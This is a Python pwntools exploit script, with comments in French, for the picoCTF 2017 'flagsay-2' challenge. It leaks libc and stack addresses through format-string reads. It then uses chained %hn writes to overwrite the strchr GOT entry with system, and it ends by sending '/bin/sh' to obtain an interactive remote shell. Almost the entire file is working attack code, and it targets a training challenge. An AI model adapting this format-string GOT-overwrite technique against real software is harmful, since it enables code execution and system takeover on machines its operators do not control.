#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='flagsay-2'
TIME=0.02
if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59994
else:
    elf=ELF(binaire)
    libc=ELF('libc-chall.so.6')
    host='shell2017.picoctf.com'
    port=46133

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))


############

def lire():
    r=p.recvuntil("\n //")
#    print r
    i=r.index("\n             //")
    r=r[i+len("\n             //"):]
    j=r.index("\n            //")
    return(r[:j])

def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=lire()
    return(b[0:8])


def lireptroffset(i):
    global p
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    try:
        b=lire()
        b=b[:b.index('                              /')]
    except:
        b="ERREUR"
        p.close()
        p=remote(host,port)
    return(b)


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=lire()
    return(b)

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)


p=remote(host,port)

# pour l'offset 17 pointe vers l'offset 53 donc pour écrire, on écrit l'adresse dans l'offset 17 puis on écrit dans l'offset 53
'''
# mis en évidence:
for i in range(44,58):
    print i,' -> ',lireoffset(i)

print lireptroffset(17)
p.sendline("%17$hn")
lire()
print lireptroffset(17)
# là il y a eu 0x81 d'écrit
'''
# 1) la libc
reference_libc='_IO_2_1_stdin_'
adr_reference_libc=int(lireoffset(2),16)
#print hex(adr_reference_libc)

print "[+] fuite libc"
whatis("system")
#print lireoffset(11)
whatis('__libc_start_main')

# 2) la pile

basepile=int(lireoffset(17),16)-4*53

print "[+] base pile = ",hex(basepile)

#3 ) ce qu'il faut faire
cible='strchr'
but='system'
print "[+]on va remplacer la got "+cible+" par l'adresse de "+but+' soit ['+hex(elf.got[cible])+']='+hex(tolibc(cible))+' par '+hex(tolibc(but))

# mis en place de l'adresse de la got de strchr sur la pile en 55 et 56

# prepare 53

def trsf(i):
    return((i & 0xffff)-0x81)

def placeoffset(offset,decal):
    adr=trsf(basepile+4*offset)+decal
    p.sendline('%'+str(adr)+'x%17$hn')
    lire()
    
def prepare(ou):
    placeoffset(55,0)
    p.sendline('%'+str(trsf(ou))+'x%53$hn')
    lire()
    placeoffset(55,2)
    p.sendline('%'+str(trsf(ou >> 16))+'x%53$hn')
    lire()
    placeoffset(56,0)
    p.sendline('%'+str(trsf(ou+2))+'x%53$hn')
    lire()
    placeoffset(56,2)
    p.sendline('%'+str(trsf((ou+2) >> 16))+'x%53$hn')
    lire()

print "[+] mis en place de 55,56 -> got de ",cible

print "17 -> pile 53 = ",lireoffset(53)
for i in range(53,57):
    print i,' -> ',lireoffset(i)
print "[+] mis en place de 55,56 -> got de ",cible

prepare(elf.got[cible])
#prepare(basepile+57*4)
for i in range(53,57):
    print i,' -> ',lireoffset(i)
adrb=trsf(tolibc(but))
adrh=(tolibc(but)>>16) - adrb -0x81

print "[+] écrasement de la got de ",cible

chaine=fmt(adrb)+'%55$hn'+fmt(adrh)+'%56$hn'


p.sendline(chaine)
'''
lire()
print "17 -> pile 53 = ",lireoffset(53)
for i in range(53,60):
    print i,' -> ',lireoffset(i)

'''

p.recvuntil("\n //")

p.sendline("/bin/sh")
p.interactive()

p.close()
